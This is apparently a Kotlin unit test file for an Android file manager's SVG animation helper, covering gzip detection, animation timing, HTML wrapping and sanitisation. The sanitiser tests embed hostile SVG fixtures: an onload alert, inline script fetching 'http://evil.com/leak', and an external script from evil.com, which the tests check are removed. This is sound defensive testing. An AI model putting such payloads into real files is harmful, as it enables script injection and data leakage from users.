package za.kilowatch.ultimatefilemanager.viewer

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config
import java.io.ByteArrayOutputStream
import java.util.zip.GZIPOutputStream

@RunWith(RobolectricTestRunner::class)
@Config(manifest = Config.NONE)
class SvgAnimationHelperTest {

    private fun gzipCompress(data: ByteArray): ByteArray {
        val bos = ByteArrayOutputStream()
        GZIPOutputStream(bos).use { it.write(data) }
        return bos.toByteArray()
    }

    @Test
    fun testIsGzipHeader() {
        val gzipData = gzipCompress("<svg></svg>".toByteArray(Charsets.UTF_8))
        assertTrue("gzip compressed bytes should return true for isGzipHeader", SvgAnimationHelper.isGzipHeader(gzipData))

        val plainSvg = "<svg></svg>".toByteArray(Charsets.UTF_8)
        assertFalse("plain SVG bytes should return false for isGzipHeader", SvgAnimationHelper.isGzipHeader(plainSvg))

        assertFalse("empty bytes should return false for isGzipHeader", SvgAnimationHelper.isGzipHeader(ByteArray(0)))
        assertFalse("single byte should return false for isGzipHeader", SvgAnimationHelper.isGzipHeader(byteArrayOf(0x1F)))
    }

    @Test
    fun testIsSvgOrSvgz() {
        val svgXml = "<svg xmlns=\"http://www.w3.org/2000/svg\"><circle cx=\"50\" cy=\"50\" r=\"40\"/></svg>"
        assertTrue("Direct SVG XML should be recognized", SvgAnimationHelper.isSvgOrSvgz(svgXml.toByteArray(Charsets.UTF_8)))

        val xmlWithProlog = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!-- comment -->\n<svg width=\"100\" height=\"100\"></svg>"
        assertTrue("SVG with XML prolog and comment should be recognized", SvgAnimationHelper.isSvgOrSvgz(xmlWithProlog.toByteArray(Charsets.UTF_8)))

        val gzippedSvg = gzipCompress(svgXml.toByteArray(Charsets.UTF_8))
        assertTrue("Gzipped SVG (SVGZ) should be recognized", SvgAnimationHelper.isSvgOrSvgz(gzippedSvg))

        val htmlDoc = "<!DOCTYPE html><html><body>Hello</body></html>"
        assertFalse("HTML document should not be recognized as SVG", SvgAnimationHelper.isSvgOrSvgz(htmlDoc.toByteArray(Charsets.UTF_8)))

        val nonSvgXml = "<?xml version=\"1.0\"?><manifest package=\"test\"></manifest>"
        assertFalse("Non-SVG XML should not be recognized as SVG", SvgAnimationHelper.isSvgOrSvgz(nonSvgXml.toByteArray(Charsets.UTF_8)))
    }

    @Test
    fun testDecompressIfNeeded() {
        val originalText = "<svg><rect width=\"100\" height=\"100\"/></svg>"
        val compressed = gzipCompress(originalText.toByteArray(Charsets.UTF_8))

        val decompressed = SvgAnimationHelper.decompressIfNeeded(compressed)
        assertNotNull("Decompression should succeed", decompressed)
        assertEquals("Decompressed string should match original", originalText, String(decompressed, Charsets.UTF_8))

        // Non-gzip data returns as-is
        val plainBytes = originalText.toByteArray(Charsets.UTF_8)
        val passedThrough = SvgAnimationHelper.decompressIfNeeded(plainBytes)
        assertEquals("Plain bytes should be passed through unmodified", plainBytes.size, passedThrough.size)
    }

    @Test
    fun testSanitizeSvg() {
        val unsafeSvg = """
            <svg xmlns="http://www.w3.org/2000/svg" onload="alert('pwned')">
                <script type="text/javascript">
                    fetch('http://evil.com/leak');
                </script>
                <circle cx="50" cy="50" r="40" onclick="evil()" />
            </svg>
        """.trimIndent()

        val sanitized = SvgAnimationHelper.sanitizeSvg(unsafeSvg)

        assertFalse("Script tag should be removed", sanitized.contains("<script", ignoreCase = true))
        assertFalse("Script content should be removed", sanitized.contains("evil.com", ignoreCase = true))
        assertFalse("onload handler should be stripped", sanitized.contains("onload", ignoreCase = true))
        assertFalse("onclick handler should be stripped", sanitized.contains("onclick", ignoreCase = true))
        assertTrue("Valid circle element should remain", sanitized.contains("<circle"))
    }

    @Test
    fun testSmilAnimation_boundedDuration() {
        val svgWithSmil = """
            <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
                <circle cx="50" cy="50" r="40">
                    <animate attributeName="r" dur="3s" repeatCount="2" fill="freeze" />
                </circle>
            </svg>
        """.trimIndent()

        assertTrue("Should detect SMIL animation tags", SvgAnimationHelper.containsSmilAnimation(svgWithSmil))
        val durationMs = SvgAnimationHelper.parseAnimationDurationMs(svgWithSmil)
        assertEquals("Total duration should be 3s * 2 = 6000ms", 6000L, durationMs)
    }

    @Test
    fun testSmilAnimation_indefiniteRepeat() {
        val svgWithIndefinite = """
            <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
                <rect width="50" height="50">
                    <animateTransform attributeName="transform" type="rotate" dur="2.5s" repeatCount="indefinite" />
                </rect>
            </svg>
        """.trimIndent()

        assertTrue("Should detect SMIL animation tags", SvgAnimationHelper.containsSmilAnimation(svgWithIndefinite))
        val durationMs = SvgAnimationHelper.parseAnimationDurationMs(svgWithIndefinite)
        assertNull("Indefinite animations should return null duration", durationMs)
    }

    @Test
    fun testSmilAnimation_staticSvg() {
        val staticSvg = """
            <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
                <rect width="50" height="50" fill="red" />
            </svg>
        """.trimIndent()

        assertFalse("Static SVG should not report SMIL", SvgAnimationHelper.containsSmilAnimation(staticSvg))
        val durationMs = SvgAnimationHelper.parseAnimationDurationMs(staticSvg)
        assertNull("Static SVG should return null duration", durationMs)
    }

    @Test
    fun testParseClockValueMs() {
        assertEquals(3000L, SvgAnimationHelper.parseClockValueMs("3s"))
        assertEquals(250L, SvgAnimationHelper.parseClockValueMs("250ms"))
        assertEquals(1500L, SvgAnimationHelper.parseClockValueMs("1.5s"))
        assertEquals(60000L, SvgAnimationHelper.parseClockValueMs("1min"))
        assertEquals(3600000L, SvgAnimationHelper.parseClockValueMs("1h"))
        assertEquals(10000L, SvgAnimationHelper.parseClockValueMs("10"))
    }

    @Test
    fun testWrapSvgInHtml() {
        val svg = "<svg viewBox=\"0 0 100 100\"><circle cx=\"50\" cy=\"50\" r=\"40\"/></svg>"
        val html = SvgAnimationHelper.wrapSvgInHtml(svg)

        assertTrue("HTML shell must contain strict Content-Security-Policy", html.contains("default-src 'none'"))
        assertTrue("HTML shell must contain black background for media player UI", html.contains("#000000"))
        assertTrue("HTML shell must embed the SVG", html.contains("<svg viewBox=\"0 0 100 100\">"))
        assertTrue("HTML shell must contain responsive viewport meta", html.contains("viewport"))
        assertTrue("HTML shell must contain script-src for sandboxed offline scripts", html.contains("script-src 'unsafe-inline'"))
    }

    @Test
    fun testContainsInteractiveElements() {
        val scriptSvg = "<svg><script>console.log('hi');</script></svg>"
        assertTrue("SVG with script should be detected as interactive", SvgAnimationHelper.containsInteractiveElements(scriptSvg))

        val viewSvg = "<svg><view id=\"1N\" viewBox=\"0 0 100 100\"/></svg>"
        assertTrue("SVG with view should be detected as interactive", SvgAnimationHelper.containsInteractiveElements(viewSvg))

        val anchorSvg = "<svg><a href=\"#begin\"><text>Start</text></a></svg>"
        assertTrue("SVG with anchor hash should be detected as interactive", SvgAnimationHelper.containsInteractiveElements(anchorSvg))

        val clickTriggerSvg = "<svg><set attributeName=\"visibility\" to=\"visible\" begin=\"btn.click\"/></svg>"
        assertTrue("SVG with SMIL click trigger should be detected as interactive", SvgAnimationHelper.containsInteractiveElements(clickTriggerSvg))

        val staticSvg = "<svg><circle cx=\"50\" cy=\"50\" r=\"40\"/></svg>"
        assertFalse("Plain static SVG should not be detected as interactive", SvgAnimationHelper.containsInteractiveElements(staticSvg))
    }

    @Test
    fun testExtractViewPanels() {
        val svgWithViews = """
            <svg viewBox="0 0 1000 1000">
                <view id="1N" viewBox="0 0 500 500"/>
                <view id="2N" viewBox="500 0 500 500"/>
                <view id="Nav" viewBox="0 0 1000 1000"/>
            </svg>
        """.trimIndent()
        val panels = SvgAnimationHelper.extractViewPanels(svgWithViews)
        assertEquals(3, panels.size)
        assertEquals("1N", panels[0])
        assertEquals("2N", panels[1])
        assertEquals("Nav", panels[2])
    }

    @Test
    fun testSanitizeSvg_inlineScriptSupport() {
        val svgWithInline = """
            <svg xmlns="http://www.w3.org/2000/svg">
                <script type="text/javascript">
                    function nav(p) { location.hash = '#' + p; }
                </script>
                <script src="https://evil.com/tracker.js"></script>
                <circle cx="50" cy="50" r="40"/>
            </svg>
        """.trimIndent()

        // When inline scripts are allowed (for sandbox rendering), external script src is removed but inline remains
        val allowed = SvgAnimationHelper.sanitizeSvg(svgWithInline, allowInlineScripts = true)
        assertTrue("Inline script content should be preserved", allowed.contains("function nav"))
        assertFalse("External script src should be stripped", allowed.contains("evil.com"))

        // When inline scripts are disabled (default), all script tags are removed
        val stripped = SvgAnimationHelper.sanitizeSvg(svgWithInline, allowInlineScripts = false)
        assertFalse("All script tags should be stripped when allowInlineScripts is false", stripped.contains("<script"))
        assertFalse("Script content should be stripped", stripped.contains("function nav"))
    }

    @Test
    fun testContainsCssAnimation() {
        val cssSvg = """
            <svg xmlns="http://www.w3.org/2000/svg">
                <style>
                    @keyframes pulse { 0% { opacity: 0; } 100% { opacity: 1; } }
                    #circle { animation: pulse 2s infinite; }
                </style>
                <circle id="circle" cx="50" cy="50" r="40"/>
            </svg>
        """.trimIndent()
        assertTrue("SVG with @keyframes should report CSS animation", SvgAnimationHelper.containsCssAnimation(cssSvg))

        val smilSvg = """
            <svg xmlns="http://www.w3.org/2000/svg">
                <circle cx="50" cy="50" r="40">
                    <animate attributeName="r" dur="3s" repeatCount="indefinite" />
                </circle>
            </svg>
        """.trimIndent()
        assertFalse("SMIL-only SVG should not report CSS animation", SvgAnimationHelper.containsCssAnimation(smilSvg))

        val staticSvg = "<svg><circle cx=\"50\" cy=\"50\" r=\"40\"/></svg>"
        assertFalse("Static SVG should not report CSS animation", SvgAnimationHelper.containsCssAnimation(staticSvg))
    }

    @Test
    fun testWrapSvgInHtml_interactiveShim() {
        val interactiveSvg = """
            <svg viewBox="164 156 1728 1728" xmlns="http://www.w3.org/2000/svg">
                <view id="1N" viewBox="164 156 1728 1728"/>
                <view id="2N" viewBox="1956 156 1728 1728"/>
                <g id="ss"><rect width="3840" height="3840"/></g>
            </svg>
        """.trimIndent()

        val html = SvgAnimationHelper.wrapSvgInHtml(interactiveSvg, allowInlineScripts = true)
        assertTrue("Wrapper should include ufm-viewbox-clip", html.contains("ufm-viewbox-clip"))
        assertTrue("Wrapper should enforce overflow: hidden on svg", html.contains("overflow: hidden !important"))
        assertTrue("Wrapper should register hashchange listener", html.contains("hashchange"))
        assertTrue("Wrapper should preserve <view> elements", html.contains("<view id=\"1N\""))
    }
}
